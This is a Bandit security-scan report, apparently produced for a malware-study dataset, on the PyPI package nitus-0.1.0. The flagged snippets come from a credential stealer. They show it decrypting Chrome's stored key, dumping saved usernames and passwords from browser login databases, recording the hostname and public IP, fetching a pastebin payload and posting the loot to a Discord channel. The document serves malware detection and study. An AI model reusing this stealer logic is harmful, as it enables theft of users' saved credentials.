Run started:2025-04-13 08:02:42.702495

Test results:
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:23
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
22	    try:
23	        lines = file.read().decode('utf-8', errors='replace').splitlines()
24	        windows_line = next((line.strip() for line in lines if "Windows" in line), None)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:53
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
52	                fichier_discord = discord.File(nom_fichier, filename=f"{nom_fichiers}.txt")
53	                await salon.send(file=fichier_discord)
54	            else:

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:56
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
55	                print("Image(s) non trouvÃ©e(s)")
56	            await bot.close()
57	        await bot.start(token)

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
62	
63	urlrr = "https://pastebin.com/raw/6NY4E73c"
64	reponseees = requests.get(urlrr)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:64
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
63	urlrr = "https://pastebin.com/raw/6NY4E73c"
64	reponseees = requests.get(urlrr)
65	contenus = str(reponseees.text)

--------------------------------------------------
>> Issue: [B803:gethostname] socket.gethostname
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:68
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b803_gethostname.html
67	
68	nom_ordi = socket.gethostname()
69	

--------------------------------------------------
>> Issue: [B302:blacklist] socket.gethostname
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:68
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b302-socket-gethostname
67	
68	nom_ordi = socket.gethostname()
69	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:91
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
90	            with open(local_state_path, "r", encoding="utf-8") as f:
91	                local_state = f.read()
92	                local_state = json.loads(local_state)

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:94
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
93	                if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
94	                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
95	                    key = key[5:]

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:94
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
93	                if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
94	                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
95	                    key = key[5:]

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:125
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
124	    with open(f"img/{nom_ordi}", "a") as file:
125	        file.write(f"{nom_ordi}\n{ip_publique}\nWindows {windows_version}\n\n\n")
126	        for db_path in db_paths:

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:131
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
130	                    shutil.copyfile(db_path, filename)
131	                    db = sqlite3.connect(filename)
132	                    cursor = db.cursor()

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:144
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
143	                        if username or password:
144	                            file.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n")
145	                        else:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:148
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
147	                        if date_created != 86400000000 and date_created:
148	                            file.write(f"Creation date: {str(datet(date_created))}\n")
149	                        if date_last_used != 86400000000 and date_last_used:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:150
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
149	                        if date_last_used != 86400000000 and date_last_used:
150	                            file.write(f"Last Used: {str(datet(date_last_used))}\n")
151	                        file.write("=============================================================================\n")

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:151
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
150	                            file.write(f"Last Used: {str(datet(date_last_used))}\n")
151	                        file.write("=============================================================================\n")
152	                    cursor.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:152
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
151	                        file.write("=============================================================================\n")
152	                    cursor.close()
153	                    db.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:153
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
152	                    cursor.close()
153	                    db.close()
154	                    os.remove(filename)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:168
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
167	    try:
168	        response = requests.get('https://httpbin.org/ip')
169	        ip_publique = response.json().get('origin')

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:168
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
167	    try:
168	        response = requests.get('https://httpbin.org/ip')
169	        ip_publique = response.json().get('origin')

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:169
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
168	        response = requests.get('https://httpbin.org/ip')
169	        ip_publique = response.json().get('origin')
170	        return ip_publique

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/nitus-0.1.0/Nitus-0.1.0/Nitus/__init__.py:177
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
176	    with open(f"img/{nom_ordi}.txt", "w") as file:
177	        file.close()
178	    ip_publique = decalage_photo()

--------------------------------------------------

Code scanned:
	Total lines of code: 172
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 4.0
		High: 18.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 20.0
		High: 2.0
Files skipped (0):
